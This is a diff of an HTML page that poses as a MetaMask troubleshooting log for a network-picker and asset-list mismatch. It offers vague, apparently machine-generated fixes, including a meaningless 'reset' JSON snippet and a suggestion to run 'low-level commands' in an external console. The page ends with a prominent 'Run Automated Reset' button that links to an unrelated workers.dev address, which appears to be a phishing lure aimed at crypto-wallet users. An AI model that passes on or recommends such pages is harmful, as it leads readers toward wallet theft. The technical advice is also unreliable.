@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: sans-serif;
-        background: #121214;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,33 +42,29 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which incorrectly shows "All popular" assets instead of the assets specific to the chosen network.</li>
+<li>The Metamask extension displays a mismatch between the selected network in the network picker and the assets shown in the modal, which incorrectly shows "All popular" assets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a bug in the Metamask extension's logic for handling network changes and updating the asset list accordingly. The extension fails to properly sync the network selection with the asset display, leading to the mismatch.</li>
+<li>The error occurs due to a desynchronization between the network configuration and the asset retrieval mechanism, likely caused by a caching issue or an outdated extension version.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Force-refresh the Metamask extension by restarting the browser or disabling and re-enabling the extension.</li>
-<li>Clear the extension's local storage to reset its state:</li>
+<li>Update the Metamask extension to the latest version and restart the browser.</li>
+<li>Clear the browser's cache and local storage for the Metamask extension.</li>
+<li>Run the following command to reset the Metamask configuration:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">&quot;reset&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">}</span>
 </code></pre></div>
 
+<p>Consider utilizing an external console to execute low-level commands for a more precise reset.</p>
+<h2>Prerequisites</h2>
 <ul>
-<li>Manually update the extension's configuration to ensure it is set to the correct network.</li>
+<li>Metamask extension installed and enabled.</li>
+<li>Ethereum network selected in the Metamask network picker.</li>
+<li>Latest browser version with compatible Metamask extension support.</li>
 </ul>
-<p>Prerequisites:
-* Metamask extension is installed and enabled
-* The user has a basic understanding of blockchain networks and assets
-* The user has access to the browser's developer tools</p>
-<p>Consider utilizing an external console to further diagnose and resolve the issue.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
